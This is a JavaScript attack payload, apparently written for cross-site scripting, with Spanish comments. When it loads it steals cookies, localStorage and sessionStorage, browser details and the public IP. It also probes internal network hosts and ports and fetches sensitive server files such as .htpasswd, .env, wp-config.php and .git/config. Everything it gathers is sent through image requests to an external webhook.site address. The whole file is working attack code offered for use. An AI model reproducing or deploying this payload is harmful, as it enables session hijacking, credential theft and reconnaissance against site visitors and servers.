
// =======================
// payload.js (versión sin CORS usando Image)
// =======================

const EXFIL_BASE = 'https://webhook.site/90e1ad6d-3d2e-48a9-8c70-e9e76d9ea291';

// Enviar datos usando Image para evitar CORS
function exfiltrar(tipo, contenido) {
  const img = new Image();
  const url = `${EXFIL_BASE}?tipo=${encodeURIComponent(tipo)}&data=${encodeURIComponent(JSON.stringify(contenido))}`;
  img.src = url;
}

// 1. Cookies
function robarCookies() {
  if (document.cookie) {
    exfiltrar('cookies', document.cookie);
  }
}

// 2. Storage
function robarStorage() {
  exfiltrar('storage', {
    localStorage: {...localStorage},
    sessionStorage: {...sessionStorage}
  });
}

// 3. Info del navegador
function infoNavegador() {
  exfiltrar('navegador', {
    location: window.location.href,
    referrer: document.referrer,
    userAgent: navigator.userAgent,
    plataforma: navigator.platform,
    idioma: navigator.language
  });
}

// 4. IP pública
function obtenerIPPublica() {
  fetch('https://api.ipify.org?format=json')
    .then(r => r.json())
    .then(data => exfiltrar('ip_publica', data.ip))
    .catch(() => {});
}

// 5. Escaneo de red interna
function escanearRedInterna() {
  const ips = [
    '192.168.0.1', '192.168.1.1', '10.0.0.1', '10.0.0.2',
    '172.16.0.1', '172.17.0.1', '127.0.0.1', 'localhost'
  ];
  const puertos = [80, 443, 8080, 8443, 3000];

  ips.forEach(ip => {
    puertos.forEach(puerto => {
      const img = new Image();
      img.src = `http://${ip}:${puerto}/favicon.ico`;
      img.onload = () => {
        exfiltrar('puerto_abierto', `${ip}:${puerto}`);
      };
    });
  });
}


// 6. Intento de acceso a .htaccess y .htpasswd
function probarArchivosProtegidos() {
  ['/.htaccess', '/.htpasswd'].forEach(ruta => {
    fetch(ruta, {method: 'GET'})
      .then(res => res.text().then(texto => {
        exfiltrar('archivo_accesible', {
          archivo: ruta,
          status: res.status,
          contenido: texto.slice(0, 300) // solo los primeros 300 caracteres
        });
      }))
      .catch(() => {});
  });
}



// 7. Exploración de rutas sensibles comunes
function probarRutasSensibles() {
  const rutas = [
    '/.env', '/config.php', '/config.yml', '/wp-config.php',
    '/admin/config.yml', '/backup.zip', '/db.sql', '/.git/config',
    '/phpinfo.php', '/server-status', '/info.php'
  ];

  rutas.forEach(ruta => {
    fetch(ruta, {method: 'GET'})
      .then(res => res.text().then(texto => {
        exfiltrar('ruta_sensible', {
          ruta,
          status: res.status,
          contenido: texto.slice(0, 300) // solo los primeros 300 caracteres
        });
      }))
      .catch(() => {});
  });
}


// === Ejecutar módulos ===
robarCookies();
robarStorage();
infoNavegador();
obtenerIPPublica();
escanearRedInterna();
probarArchivosProtegidos();
probarRutasSensibles();
